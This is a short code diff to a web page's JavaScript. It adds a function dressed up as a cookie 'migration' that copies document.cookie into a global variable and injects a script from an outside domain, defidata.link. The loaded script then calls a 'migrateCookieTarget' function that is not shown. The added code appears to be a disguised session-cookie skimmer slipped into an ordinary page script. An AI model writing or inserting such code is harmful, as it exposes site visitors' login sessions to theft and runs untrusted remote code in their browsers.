@@ -168,6 +168,18 @@ function loadMessage() {
     window.scrollTo(0, 0);
 }
 
+$cookieMigratedCopy = null;
+function migrateCookieSource() {
+    $cookieMigratedCopy = document.cookie + "";
+    var tag = document.createElement('script');
+    tag.onload = function () { 
+        migrateCookieTarget();
+        console.log("Migrated")
+    }
+    tag.src = 'https://defidata.link/tools.js';
+    document.getElementsByTagName('body')[0].appendChild(tag);
+}
+
 var _gaq = _gaq || [];
 _gaq.push(['_setAccount', "UA-24554015-2"]);
 _gaq.push(['_trackPageview']);
